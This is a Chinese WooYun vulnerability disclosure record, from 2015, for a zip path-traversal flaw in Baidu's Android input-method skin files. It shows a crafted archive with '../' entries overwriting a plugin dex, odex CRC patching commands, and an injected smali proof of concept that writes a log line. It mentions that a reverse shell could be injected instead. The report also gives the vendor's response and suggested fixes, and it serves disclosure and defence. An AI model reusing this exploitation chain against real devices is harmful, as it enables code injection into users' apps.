{"id": 65393, "wybug_id": "wooyun-2015-0123871", "wybug_title": "百度输入安卓客户端代码感染漏洞分析（俗称寄生兽）", "wybug_corp": "百度", "wybug_author": "路人甲", "wybug_date": "2015-07-01 13:00", "wybug_open_date": "2015-09-30 14:56", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向公众公开  简要描述： 百度输入安卓客户端代码感染漏洞 详细说明：  输入法皮肤解压缩无限制插入 ../ 即可拥有输入法的写权限下载 bds 或者 bdt 文件,本质是压缩文件\n» file bi_skin_413.bds \tbi_skin_413.bds: Zip archive data, at least v1.0 to extract\n 将会被解压到 land 目录下\nroot@hammerhead:/data/data/com.baidu.input/files/land # ls -la\t-rw------- u0_a76   u0_a76         63 2015-06-30 18:08 Info.txt\t-rw------- u0_a76   u0_a76         35 2015-06-30 18:08 Token.txt\t-rw------- u0_a76   u0_a76       2396 2015-06-30 18:08 bh.ini\t-rw------- u0_a76   u0_a76        711 2015-06-30 18:08 cand1.cnd\t-rw------- u0_a76   u0_a76       5110 2015-06-30 18:08 def_26.ini\t-rw------- u0_a76   u0_a76       2726 2015-06-30 18:08 def_9.ini\t-rw------- u0_a76   u0_a76     201638 2015-06-30 18:08 demo.png\t-rw------- u0_a76   u0_a76       5061 2015-06-30 18:08 en_26.ini\t-rw------- u0_a76   u0_a76       5063 2015-06-30 18:08 en_26s.ini\t-rw------- u0_a76   u0_a76       2818 2015-06-30 18:08 en_9.ini\t-rw------- u0_a76   u0_a76       2835 2015-06-30 18:08 en_9s.ini\t-rw------- u0_a76   u0_a76       1317 2015-06-30 18:08 gen.ini\t-rw------- u0_a76   u0_a76        309 2015-06-30 18:08 hint1.pop\t-rw------- u0_a76   u0_a76       1653 2015-06-30 18:08 hw_full.ini\t-rw------- u0_a76   u0_a76       1523 2015-06-30 18:08 hw_grid.ini\t-rw------- u0_a76   u0_a76       3850 2015-06-30 18:08 num_26.ini\t-rw------- u0_a76   u0_a76       2379 2015-06-30 18:08 num_9.ini\t-rw------- u0_a76   u0_a76       5104 2015-06-30 18:08 py_26.ini\t-rw------- u0_a76   u0_a76       2758 2015-06-30 18:08 py_9.ini\tdrwx------ u0_a76   u0_a76            2015-06-30 18:08 res\t-rw------- u0_a76   u0_a76        947 2015-06-30 18:08 sel_ch.ini\t-rw------- u0_a76   u0_a76        755 2015-06-30 18:08 sel_en.ini\t-rw------- u0_a76   u0_a76        996 2015-06-30 18:08 symbol.ini\n 制作一个包含../的压缩包来验证猜想 (mac下使用 betterzip 完成)\t»\ntar vft basic.bdt \t-rwxrwxrwx  0 0      0          63  6  3 16:34 Info.txt\t-rwxrwxrwx  0 0      0          35  6  9 18:15 Token.txt\t-rwxrwxrwx  0 0      0      201638  6  3 16:34 demo.png\t-rwxrwxrwx  0 0      0           4  6 30 19:29 ../../../../../../../../../../../../data/data/com.baidu.input/hello\tdrwxrwxrwx  0 0      0           0  6  9 16:50 land/\t-rwxrwxrwx  0 0      0        2396  6  9 10:43 land/bh.ini\t-rwxrwxrwx  0 0      0         711  6  3 16:34 land/cand1.cnd\t-rwxrwxrwx  0 0      0        5110  6  9 10:43 land/def_26.ini\n 接下来要将写权限转换成执行权限.替换插件 dex/jar/odex/so 等文件.定位插入点方法:- 静态检索反编译代码中DexClassLoader 构造方法- hook构造方法DexClassLoader (String dexPath, String optimizedDirectory, String libraryPath, ClassLoader parent)工具中心一些操作(扫一扫)触发了这个挂钩\n06-30 23:48:04.004  11492-11502/? I/IPoison-com.baidu.input﹕ dexPath = /storage/emulated/0/baidu/ime/plugins/apks/com.baidu.input.plugin.kit.qrcode-1.jar | optimizedDirectory = /data/data/com.baidu.input/app_megapp/com.baidu.input.plugin.kit.qrcode | libraryPath = /data/data/com.baidu.input/app_megapp/com.baidu.input.plugin.kit.qrcode/lib\troot@hammerhead:/data/data/com.baidu.input/app_megapp/com.baidu.input.plugin.kit.qrcode # ls -la\t-rw-r--r-- u0_a76   u0_a76      39472 2015-06-30 23:48 com.baidu.input.plugin.kit.qrcode-1.dex\tdrwx------ u0_a76   u0_a76            2015-06-30 23:48 lib\troot@hammerhead:/data/data/com.baidu.input/app_megapp/com.baidu.input.plugin.kit.qrcode # ls -la lib\t-rw------- u0_a76   u0_a76     108428 2015-06-30 23:48 librabjni_V2_1_0.so\n 注入操作1:注入 com.baidu.input.plugin.kit.qrcode-1.dex- smali注入反弹 shell 代码- path crc and modwhen产生问题:将 odex 转成 smali 后注入代码再转换成 dex...而不是 odex 了.\t » file inject.dex \tinject.dex: Dalvik dex file version 035\t » file com.baidu.input.plugin.kit.qrcode-1.dex \tcom.baidu.input.plugin.kit.qrcode-1.dex: Dalvik dex file (optimized for host) version 036 patch 操作:\t» python patch_odex.py patch com.baidu.input.plugin.kit.qrcode-1.dex dex.apk patch.dex       \tOriginal modTime: 0x46e152ce\tOriginal CRC: 0x15a84323\tApk ModTime: 0x44f598ba\tAPK classes CRC: 0xf022cd8c\t » python patch_odex.py print patched.odex                                                       \tmodTime: 0x44f598ba\tcrc: 0xf022cd8c\tdalvik build ver: 0x1b生成 poc 操作:注入一段 log 代码到com.baidu.idl.barcode.Barcode\t.class public final Lcom/baidu/idl/barcode/Barcode;\t.super Ljava/lang/Object;\t# direct methods\t.method static constructor <clinit>()V\t    .locals 3\t    :try_start_0\t    const-string v0, \"rabjni_V2_1_0\"\t    const-string v2, \"Inject\"\t    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I\t    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V将的语言包加入 poc 文件\n» tar vft basic.bdt \t-rwxrwxrwx  0 0      0          63  6  3 16:34 Info.txt\t-rwxrwxrwx  0 0      0          35  6  9 18:15 Token.txt\t-rwxrwxrwx  0 0      0      201638  6  3 16:34 demo.png\t-rwxrwxrwx  0 0      0           4  6 30 19:29 ../../../../../../../../../../../../data/data/com.baidu.input/app_megapp/com.baidu.input.plugin.kit.qrcode/com.baidu.input.plugin.kit.qrcode-1.dex\tdrwxrwxrwx  0 0      0           0  6  9 16:50 land/\t-rwxrwxrwx  0 0      0        2396  6  9 10:43 land/bh.ini\t-rwxrwxrwx  0 0      0         711  6  3 16:34 land/cand1.cnd\t-rwxrwxrwx  0 0      0        5110  6  9 10:43 land/def_26.ini\n最后效果...当然也可以注入个弹 shell 的...也做个视频?\t07-01 12:28:02.248  24160-24160/? E/Inject﹕ rabjni_V2_1_0   漏洞证明：  \n\n\n\n   修复方案：  1.encode ../2.check plugins ,such as so/odex...   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-07-02 14:54 厂商回复： 十分感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-01 13:27 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  原来这个就是传说中的寄生兽？    \n     2015-07-01 14:13 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  关联文章http://drops.wooyun.org/papers/6910    \n     2015-07-01 14:17 |    \t\tPyNerd \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:29        | Just for shell.)\t\t \n  这就是传说中的寄生兽？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}